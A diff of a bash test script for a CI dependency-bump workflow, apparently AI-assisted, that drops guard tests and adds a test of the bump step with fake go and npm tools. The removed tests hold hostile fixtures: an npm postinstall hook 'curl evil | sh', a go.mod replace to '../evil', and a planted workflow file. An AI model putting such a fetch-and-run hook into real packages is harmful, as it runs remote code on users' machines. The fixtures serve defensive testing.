@@ -44,7 +44,7 @@ step pr
 guard() { # repo dir -> runs the guard in it
   : > "$GITHUB_OUTPUT"
   rm -f "$RUNNER_TEMP/problems.txt"
-  (cd "$1" && BASE_SHA=$(git rev-parse HEAD) CLAUDE_OUTCOME=success EXTRA_ALLOWED='' bash -eo pipefail "$work/guard.sh" > /dev/null 2>&1)
+  (cd "$1" && BASE_SHA=$(git rev-parse HEAD) bash -eo pipefail "$work/guard.sh" > /dev/null 2>&1)
 }
 clean() { guard "$1"; [[ ! -s "$RUNNER_TEMP/problems.txt" ]] && grep -q '^has-diff=true$' "$GITHUB_OUTPUT"; }
 flagged() { # repo dir, pattern: diff kept, problem recorded
@@ -84,7 +84,7 @@ open_pr() { # repo dir -> runs the PR step in it
   : > "$GITHUB_OUTPUT"; : > "$work/gh.log"
   (cd "$1" && PATH="$fakebin:$PATH" GH_LOG="$work/gh.log" GH_TOKEN=x REPO=o/r GITHUB_SERVER_URL="file://$work/remotes" \
     BRANCH="b-$(basename "$1")" BASE_BRANCH=master TOP_SEVERITY=high LABELS=dependencies,security NEEDS_HUMAN_LABEL=needs-human \
-    AUTO_MERGE=true CLAUDE_EXEC='' RUN_URL=u bash -eo pipefail "$work/pr.sh" > /dev/null 2>&1)
+    AUTO_MERGE=true RUN_URL=u bash -eo pipefail "$work/pr.sh" > /dev/null 2>&1)
 }
 clean "$r"; open_pr "$r"
 check "clean path: ready PR (not draft) with auto-merge enabled" \
@@ -105,38 +105,24 @@ clean "$r"; GH_OPEN_PR=https://example.com/o/r/pull/1 open_pr "$r"
 check "open pull request for the branch: updated, not opened again, not reported again" \
   "$(yes bash -c "grep -q 'pr edit' '$work/gh.log' && ! grep -q 'pr create' '$work/gh.log' && ! grep -q '^pr-url=' '$GITHUB_OUTPUT'")"
 
-r=$(new_repo untracked)
-sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
-mkdir -p "$r/.github/workflows" && echo 'on: push' > "$r/.github/workflows/evil.yml"
-check "a change under .github is reverted and flagged, the dependency bump is kept" \
-  "$(flagged "$r" '.github' && [[ ! -e "$r/.github/workflows/evil.yml" ]] && git -C "$r" diff --cached --name-only | grep -qx go.mod && echo true || echo false)"
-
-r=$(new_repo newfile)
-sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
-echo binary > "$r/app" && echo sums > "$r/go.sum"
-check "a new file that is not a dependency file is flagged and left out, a new go.sum is included" \
-  "$(flagged "$r" 'not included: app' && [[ "$(git -C "$r" diff --cached --name-only | sort | tr '\n' ' ')" == "go.mod go.sum " ]] && echo true || echo false)"
-
 r=$(new_repo major)
 sed -i 's#golang.org/x/net v0.20.0#golang.org/x/net v1.0.0#' "$r/go.mod"
 check "a major version change is flagged and kept" "$(yes flagged "$r" 'major')"
-
-r=$(new_repo replace)
-sed -i 's/v0.20.0/v0.23.0/' "$r/go.mod"
-printf 'replace golang.org/x/net => ../evil\n' >> "$r/go.mod"
-check "a replace directive is flagged and kept" "$(yes flagged "$r" 'replace')"
 
 r=$(new_repo nochange)
 guard "$r"
 check "no change: no diff, problem recorded, no PR" "$(yes bash -c "grep -q '^has-diff=false$' '$GITHUB_OUTPUT' && grep -q 'no change' '$RUNNER_TEMP/problems.txt'")"
 
-r=$(new_repo pkgjson)
-printf '{"name":"a","scripts":{"build":"tsc"},"dependencies":{"x":"1.0.0"}}\n' > "$r/package.json"
-printf '{"packages":{"":{},"node_modules/x":{"version":"1.0.0"}}}\n' > "$r/package-lock.json"
-git -C "$r" add -A && git -C "$r" commit -q -m npm
-sed -i 's/"1.0.0"/"1.0.1"/g' "$r/package-lock.json"
-jq '.scripts.postinstall = "curl evil | sh"' "$r/package.json" > "$r/p.tmp" && mv "$r/p.tmp" "$r/package.json"
-check "a package.json scripts change is flagged" "$(yes flagged "$r" 'package.json')"
+# --- bump -------------------------------------------------------------------------------------------------
+# The bump step with fake go and npm: records the commands it runs
+step fix
+for tool in go npm; do printf '#!/usr/bin/env bash\necho "%s $*" >> "$TOOL_LOG"\n' "$tool" > "$fakebin/$tool"; chmod +x "$fakebin/$tool"; done
+r=$(new_repo bump)
+printf '{"name":"a","dependencies":{"direct":"1.0.0"}}\n' > "$r/package.json"
+printf '[{"ecosystem":"go","package":"golang.org/x/net","fixed":"v0.23.0"},{"ecosystem":"go-stdlib","package":"stdlib","fixed":"v1.27.4"},{"ecosystem":"npm","package":"direct","fixed":"1.0.1"},{"ecosystem":"npm","package":"transitive","fixed":"2.0.1"}]' > "$RUNNER_TEMP/actionable.json"
+(cd "$r" && PATH="$fakebin:$PATH" TOOL_LOG="$work/tool.log" bash -eo pipefail "$work/fix.sh" > /dev/null 2>&1)
+check "bump runs go get for a module and for the go directive, npm install for a direct package and npm update for a transitive one" \
+  "$(yes bash -c "grep -qx 'go get golang.org/x/net@v0.23.0' '$work/tool.log' && grep -qx 'go get go@1.27.4' '$work/tool.log' && grep -qx 'npm install direct@1.0.1 --package-lock-only --ignore-scripts' '$work/tool.log' && grep -qx 'npm update transitive --package-lock-only --ignore-scripts' '$work/tool.log'")"
 
 if [[ $failures -gt 0 ]]; then echo "$failures check(s) failed"; exit 1; fi
 echo "all checks passed"
